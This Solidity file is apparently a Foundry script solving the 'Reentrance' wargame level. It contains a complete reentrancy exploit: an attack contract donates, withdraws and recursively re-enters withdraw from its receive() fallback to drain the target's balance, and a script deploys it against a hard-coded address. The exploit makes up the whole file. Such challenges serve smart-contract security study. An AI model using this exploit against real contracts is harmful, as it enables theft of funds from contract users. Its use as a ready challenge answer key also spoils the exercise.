// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";


interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public amount = 0.001 ether;
    
    constructor(address _target) {
        target = IReentrance(_target);
    }
    
    function attack() external payable {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }
    
    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}

contract ReentranceSolution is Script {
    function run() external {
        address target = 0x4062bfa7168d9e87AF500aAabE70Ce8F4A5BE27e;
        
        vm.startBroadcast();
        
        ReentranceAttack attacker = new ReentranceAttack(target);
        attacker.attack{value: 0.001 ether}();
        
        vm.stopBroadcast();
    }
}
